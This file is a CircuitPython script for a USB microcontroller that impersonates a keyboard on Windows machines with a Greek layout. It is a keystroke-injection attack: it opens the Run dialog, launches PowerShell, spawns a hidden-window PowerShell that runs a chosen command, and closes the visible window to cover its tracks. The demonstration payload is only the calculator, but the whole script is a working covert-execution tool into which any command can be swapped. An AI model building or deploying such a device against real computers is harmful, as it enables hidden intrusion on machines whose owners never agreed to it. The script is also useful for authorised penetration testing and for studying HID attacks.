import time
import usb_hid
from adafruit_hid.keyboard import Keyboard
from keyboard_layout_win_gr import KeyboardLayout
from keycode_win_gr import Keycode
import board
import digitalio

kbd = Keyboard(usb_hid.devices)
layout = KeyboardLayout(kbd)

led = digitalio.DigitalInOut(board.LED)
led.direction = digitalio.Direction.OUTPUT

def run_powershell(command):
    kbd.press(Keycode.WINDOWS, Keycode.R)
    kbd.release_all()
    time.sleep(0.2)
    layout.write('powershell -NoP', delay=0.005)
    kbd.press(Keycode.ENTER)
    kbd.release_all()
    time.sleep(3)
    layout.write(f"Start-Process powershell -WindowStyle Hidden -ArgumentList \"-NoP -C {command}\"", delay=0.005)
    kbd.press(Keycode.ENTER)
    kbd.release_all()
    time.sleep(0.2)
    layout.write('exit', delay=0.005)
    kbd.press(Keycode.ENTER)
    kbd.release_all()

command = "calc"
run_powershell(command)

while True:
    led.value = True
